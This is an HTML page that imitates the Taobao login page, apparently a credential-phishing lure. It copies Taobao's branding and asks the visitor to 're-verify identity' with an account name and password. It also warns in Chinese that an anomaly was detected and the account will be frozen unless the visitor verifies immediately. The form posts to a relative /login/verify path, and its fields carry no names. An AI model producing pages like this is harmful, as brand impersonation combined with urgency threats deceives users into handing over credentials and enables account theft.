<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>淘宝网登录</title>
<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f5f5f5;color:#333}
header{background:#ff5000;color:#fff;padding:14px 40px;display:flex;align-items:center;gap:24px}
.logo{font-size:25px;font-weight:700;letter-spacing:2px}
.card{margin:36px auto;width:400px;background:#fff;border-radius:10px;padding:30px;box-shadow:0 2px 10px #0001}
.card h2{margin:0 0 6px;font-size:20px;color:#ff5000}.card p{margin:0 0 16px;font-size:13px;color:#999}
label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
button{width:100%;height:42px;margin-top:18px;background:#ff5000;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
.tip{margin:10px 0 0;font-size:12px;color:#f60}
footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
<body><header><span class="logo">淘宝网</span><span>安全登录中心</span></header>
<div class="card"><h2>淘宝账号登录</h2><p>为确保账户安全，请重新验证身份</p>
<form action="/login/verify" method="post">
<label>淘宝账号 / 手机号</label><input placeholder="请输入账号">
<label>登录密码</label><input type="password" placeholder="请输入密码">
<button type="submit">立即登录</button></form>
<p class="tip">系统检测到您的账户存在异常，请立即完成验证，否则账户将被冻结。</p></div>
<footer>© 淘宝网 · 请从官网 taobao.com 访问</footer></body></html>
